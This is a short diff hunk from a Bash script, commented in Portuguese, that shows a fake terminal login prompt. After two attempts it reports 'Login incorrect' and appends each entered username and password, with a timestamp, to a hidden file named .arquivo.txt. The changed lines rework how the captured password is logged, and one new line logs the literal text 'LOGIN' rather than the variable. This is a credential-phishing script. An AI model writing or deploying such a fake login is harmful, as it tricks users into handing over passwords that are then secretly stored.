@@ -11,8 +11,8 @@ incorreto(){ sleep 3 ; echo ; echo "Login incorrect" ; }
 		echo
 			 #[[ $LOGIN == "vagrant" ]] && [[ $PASSW == "vagrant" ]] && \
 			#break 2 || incorreto
-			echo "$(date)">> $LOGIN >> .arquivo.txt
-				echo "$(date)">> $PASSW >> .arquivo.txt
+			echo "$(date)>> Login: LOGIN" >> .arquivo.txt
+			echo "$(date)>> $PASSW" >> .arquivo.txt
 		  count=$(($count+1)) 
 	    [[ $count == "2" ]] && break
 done  
